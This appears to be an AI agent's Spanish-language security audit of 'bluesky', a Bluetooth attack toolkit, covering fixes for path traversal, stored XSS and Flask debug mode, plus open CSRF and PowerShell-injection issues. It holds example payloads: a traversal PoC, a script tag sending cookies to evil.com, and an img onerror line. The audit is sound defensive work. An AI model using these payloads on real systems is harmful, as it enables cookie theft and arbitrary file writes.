## Detalle por corrección

### 1. Path Traversal en `Session` — **Crítica**

**Componente:** `bluesky/core/session.py`

**Descripción del bug:**
El constructor `Session.__init__(name, base_dir)` y el método `Session.load(name)`
interpolan directamente el parámetro `name` en la ruta del archivo de sesión:

```python
# ANTES (vulnerable):
self.session_file = self.base_dir / f"{name}.json"
```

Sin validación, un `name` como `"../../../../tmp/evil"` produce una ruta
resuelta FUERA del directorio de sesiones. Lo mismo aplica a `load()`.

**Severidad:** Crítica

**Causa raíz:**
- Ausencia de validación/saneamiento del input del usuario antes de construir
  rutas de archivo con `pathlib`.
- Falta de defensa en profundidad (comprobación de que la ruta resuelta
  sigue dentro del `base_dir`).

**Impacto demostrado (PoC):**
```python
from bluesky.core.session import Session
import os
s = Session(name="../../../../tmp/evil_pwned")
s.add_target("AA:BB:CC:DD:EE:FF", name="pwn")
s.add_result("bluejacking", "AA:BB:CC:DD:EE:FF", True,
             data={"msg": "pwned"})
# Resultado: /tmp/evil_pwned.json contiene JSON arbitrario
assert os.path.exists("/tmp/evil_pwned.json")  # True
```

Un usuario malintencionado con acceso al CLI/consola o un plugin hostil podría:
- Sobrescribir archivos de configuración del usuario (p. ej. `~/.bashrc` con
  extensión `.json` — limitado pero plausible).
- Exfiltrar datos escribiendo sesiones en sitios accesibles por otros servicios.
- En combinación con `load()`, leer archivos JSON arbitrarios del sistema.

**Solución aplicada:**

1. Nuevo helper `_sanitize_session_name(name)` en `core/session.py` que:
   - Rechaza bytes nulos, separadores de ruta (`/`, `\\`) y secuencias `..`.
   - Aplica un whitelist regex `^[A-Za-z0-9._-]+$`.
   - Como fallback, sustituye cualquier carácter no whitelist por `_`
     (mejor UX que fallar; conserva el nombre original en forma segura).
2. `__init__` y `load()` ahora saneen `name` antes de construir el path.
3. `load()` añade una **defensa en profundidad**: tras construir el path,
   comprueba con `Path.resolve()` que el resultado sigue dentro del
   `base_dir`. Si no, retorna `False` (sin explotar).

**Archivos modificados:**
- `bluesky/core/session.py`

**Cómo verificar que está corregido:**
```bash
cd /path/to/bluesky
python -c "
import os
from bluesky.core.session import Session
s = Session(name='../../../../tmp/evil_pwned')
print('session_file:', s.session_file)
# session_file: <base_dir>/tmp_evil_pwned.json  (no traversal)
s.add_target('AA:BB:CC:DD:EE:FF')
s.add_result('bluejacking', 'AA:BB:CC:DD:EE:FF', True, data={})
print('Archivo atravesado existe?',
      os.path.exists('/tmp/evil_pwned.json'))  # False
"
python -m pytest tests/test_session.py -v  # 10/10 pasan
```

### 2. XSS almacenado en reporte Autopilot — **Alta**

**Componente:** `bluesky/modules/attacks/autopilot.py` (método `_phase_report`)

**Descripción del bug:**
Al generar el reporte HTML final, los datos dinámicos provenientes de
dispositivos Bluetooth detectados (nombre anunciado, MAC, IDs de
vulnerabilidades, nombres de módulos) se interpolaban directamente en el
HTML **sin escapado**:

```python
# ANTES (vulnerable):
target_rows += f"""
<tr>
    <td>{t['name']}</td>            <-- sin escape
    <td><code>{t['mac']}</code></td>
    <td>{len(found)}</td>
    <td>{vuln_str or 'Ninguna'}</td>
</tr>"""
```

Si un dispositivo Bluetooth cercano se anuncia con un nombre como
`<script>fetch('//evil.com/?'+document.cookie)</script>` o
`<img src=x onerror=alert(document.cookie)>`, ese string termina literalmente
dentro del HTML del reporte. Al abrir el reporte en el navegador, el JS se
ejecuta en el contexto `file://` (acceso a archivos locales vía XHR) o en
el contexto del dashboard web.

**Severidad:** Alta (no crítica porque requiere un atacante con presencia
física cercana para anunciar un nombre hostil, pero el vector es real y
silencioso).

**Causa raíz:**
- Uso de f-strings para construir HTML en lugar de un motor de plantillas
  con autoescape.
- `Reporter.to_html()` (en `core/reporter.py`) ya estaba correctamente
  escapado con `html.escape` — pero `Autopilot._phase_report` reimplementa
  la generación HTML y no aplicaba el mismo patrón.

**Solución aplicada:**

1. Importación de `html.escape as html_escape` en `autopilot.py`.
2. Nuevo método estático `_esc(value)` que envuelve `html_escape` y
   tolera `None` y tipos no-str.
3. Todos los datos dinámicos interpolados en el HTML del reporte
   (`t['name']`, `t['mac']`, `v['id']`, `mac`, `r['module']`, etc.)
   se envuelven con `self._esc(...)`.
4. El contador `len(found)-5` también se escapa (defensa en profundidad,
   aunque sea int).

**Archivos modificados:**
- `bluesky/modules/attacks/autopilot.py`

**Cómo verificar que está corregido:**
```bash
cd /path/to/bluesky
python -c "
from bluesky.modules.attacks.autopilot import Autopilot
import os, re
targets = [
    {'mac': 'AA:BB:CC:DD:EE:FF',
     'name': '<script>alert(\"xss\")</script>', 'type': 'classic'},
]
results = {'AA:BB:CC:DD:EE:FF': [
    {'module': 'bluejacking', 'target': 'AA:BB:CC:DD:EE:FF',
     'success': True, 'data': {}, 'error': None}]}
all_vulns = {'AA:BB:CC:DD:EE:FF': [
    {'id': '<script>evil()</script>', 'name': 'x',
     'severity': 'high', 'vulnerable': True, 'module': 'knob'}]}
a = Autopilot()
report = a._phase_report(targets, results, all_vulns)
content = open(report).read()
assert '<script>alert' not in content, 'XSS no escapado!'
assert '<img src=x onerror' not in content, 'img onerror no escapado!'
assert '&lt;script&gt;alert' in content, 'debería estar escapado'
os.unlink(report)
print('OK: XSS bloqueado en autopilot report')
"
```

### 3. Flask `debug=True` por defecto en `__main__` — **Alta**

**Componente:** `bluesky/web/app.py` (bloque `if __name__ == "__main__"`)

**Descripción del bug:**
La entrada ejecutable del módulo web (`python -m bluesky.web.app` o
`python bluesky/web/app.py`) arrancaba el servidor Flask con `debug=True`
hardcoded:

```python
# ANTES (peligroso):
if __name__ == "__main__":
    run_web_server(port=5000, debug=True)
```

El modo debug de Flask habilita el **Werkzeug debugger interactivo**, que
permite ejecutar código Python arbitrario desde el navegador accediendo a
la URL `/console`. Aunque por defecto se bindea a `127.0.0.1`, esto no es
suficiente:

- Cualquier página web maliciosa puede hacer un POST al `/console` del
  `127.0.0.1` del usuario (DNS rebinding, CSRF a localhost).
- Si el usuario cambia el `--host` a `0.0.0.0` (para acceder desde móvil),
  el debugger queda expuesto a toda la red local.
- Werkzeug protege el debugger con un PIN derivado de métricas del
  sistema, pero ese PIN se puede predecir o brute-forcear en muchos
  entornos.

**Severidad:** Alta (RCE potencial con vector CSRF a localhost).

**Causa raíz:**
- Costumbre de developer de dejar `debug=True` durante el desarrollo en
  el entrypoint ejecutable, en lugar de forzar opt-in.

**Solución aplicada:**

El bloque `if __name__ == "__main__"` ahora:
1. Define un `argparse.ArgumentParser` con flags `--port`, `--host`,
   `--debug` (opt-in) y `--open`.
2. Pasa `debug=args.debug` (por defecto `False`) a `run_web_server`.
3. Incluye comentario explicando por qué `debug=True` era peligroso.

**Archivos modificados:**
- `bluesky/web/app.py`

**Cómo verificar que está corregido:**
```bash
cd /path/to/bluesky
python -c "
import inspect, ast
src = inspect.getsource(__import__('bluesky.web.app', fromlist=['x']).__loader__.get_source('bluesky.web.app'))
# Buscar el bloque __main__ y comprobar que debug no es True hardcoded
tree = ast.parse(src)
for node in ast.walk(tree):
    if isinstance(node, ast.If):
        if (isinstance(node.test, ast.Compare)
            and isinstance(node.test.left, ast.Name)
            and node.test.left.id == '__name__'):
            # __main__ block
            src_main = ast.unparse(node)
            assert 'debug=True' not in src_main, 'debug=True hardcoded sigue ahí!'
            assert 'args.debug' in src_main, 'debug no es opt-in'
            break
print('OK: __main__ no usa debug=True por defecto')
"
```

## Bugs/vulnerabilidades detectados pero NO corregidos aún

### 4. Web app sin protección CSRF — **Media**

**Componente:** `bluesky/web/app.py` (endpoints POST `/api/modules/<name>/run`, `/api/scan`)

**Descripción:**
Los endpoints POST aceptan JSON sin verificar:
- El header `Origin` o `Referer`.
- Un token CSRF.
- El `Content-Type` (con `get_json(silent=True)` cualquier cosa se traga como `{}`).

Aunque la app está bindeada a `127.0.0.1` por defecto, esto no bloquea
peticiones CSRF desde webs maliciosas (el navegador del usuario las envía
al localhost del usuario). Un atacante podría:
- Lanzar módulos de ataque contra víctimas BT del auditado.
- Lanzar scans que consuman tiempo.

**Severidad:** Media
**Motivo de no corregir:**
Requiere decidir entre (a) añadir token CSRF + cambios en el frontend
JS, o (b) validar `Origin` (rompe accesos desde `file://` o scripts
curl). Mejor tratarlo con el Director en próxima ronda.

### 5. `/api/config` expone información del sistema — **Baja/Media**

**Componente:** `bluesky/web/app.py` (`api_config`)

**Descripción:**
El endpoint `/api/config` retorna toda la configuración del bluesky,
incluyendo:
- Plataforma, OS, MAC del adaptador Bluetooth local.
- Path del archivo de configuración activo.
- Estructura completa de `module_options` y `favorites` (potencialmente
  incluyendo MACs de targets previos).

Si la app se expone externamente (incluso por accidente), filtra info
útil para fingerprinting.

**Severidad:** Baja/Media
**Motivo de no corregir:**
Requiere decisión de diseño sobre qué información debe ser visible en
el dashboard. Sugiero al Director evaluar filtrar `default_target`,
`favorites` y `module_options` de la respuesta API.

### 6. `_check_usb_product_windows` interpola `product_name` en PowerShell — **Baja**

**Componente:** `bluesky/core/hardware.py:558-572`

**Descripción:**
```python
ps_script = f"""
$devices = Get-PnpDevice -ErrorAction SilentlyContinue |
            Where-Object {{ $_.FriendlyName -match '{product_name}' }}
...
"""
```

`product_name` se interpola sin escape dentro de un regex de PowerShell.
Hoy todos los callers pasan strings hardcoded (`"rtl8761"`), pero si
algún módulo futuro pasa input del usuario, esto permitiría inyección
de PowerShell (no regex-injection pura, sino RCE vía construcciones
PowerShell como `';Add-Type ...;'{`).

**Severidad:** Baja (input actualmente hardcoded, no explotable hoy)
**Motivo de no corregir:**
Requiere refactorizar el helper para escapar regex PowerShell y
restringir `product_name` a `[A-Za-z0-9_-]`. Dejar para próxima ronda
junto con una auditoría más amplia de los `ps_script` interpolados en
`windows_backend.py` y `device_scanner.py`.

## Recomendaciones de seguridad generales para el resto de agentes

### Para el agente **Implementaciones**

1. **Nunca interpolar datos externos en comandos PowerShell** sin
   escape. El patrón actual en `hardware.py` funciona porque los
   inputs son hardcoded, pero cualquier nuevo feature que acepte
   input del usuario (MAC, nombre de dispositivo, etc.) DEBE validar
   con regex estricto (`re.match(r"^[A-Za-z0-9:_-]+$", x)`) antes de
   pasar a `subprocess` o a f-strings de PowerShell.
2. **`subprocess.run` SIEMPRE con lista argv**, nunca con strings
   concatenados. El código actual cumple esto — mantenerlo.
3. **Todo dato dinámico en HTML → `html.escape`**. Si vais a generar
   HTML en cualquier módulo nuevo, seguid el patrón de
   `Reporter.to_html()` o `Autopilot._phase_report()` (post-fix):
   helper `_esc()` para cada interpolación.

### Para el agente **Pulimiento**

1. Considerar extraer `_esc()` a `bluesky/utils/format.py` para que
   `Reporter`, `Autopilot` y futuros módulos compartan el mismo helper.
2. Los tests `test_qa_round2.py::TestReporterHtmlEscaping` ya cubren
   `Reporter.to_html()` — sería valioso añadir tests equivalentes
   para `Autopilot._phase_report()` (vector XSS similar).

### Para el **Director**

1. **Política de secretos**: el operador compartió un PAT de GitHub
   en texto plano en el chat. Recomiendo:
   - Añadir a `CONTRIBUTING.md` que nunca se compartan tokens por chat.
   - Documentar en `README.md` que los tokens de CI deben ir en
     `secrets` del repositorio, nunca en código.
2. **Pendiente de decisión de diseño**: ¿debería `/api/config` exponer
   MAC del adaptador local y favoritos? Si la app se usa en
   laboratorios compartidos, conviene restringir.
3. **Política de plugins**: el sistema carga cualquier `.py` que
   encuentre en `plugins/` con `importlib` y lo ejecuta con
   `exec_module`. Esto es por diseño (plugins = código), pero
   conviene documentar explícitamente que `plugins/` es un directorio
   de confianza y que no se deben colocar archivos descargados ahí
   sin revisión.
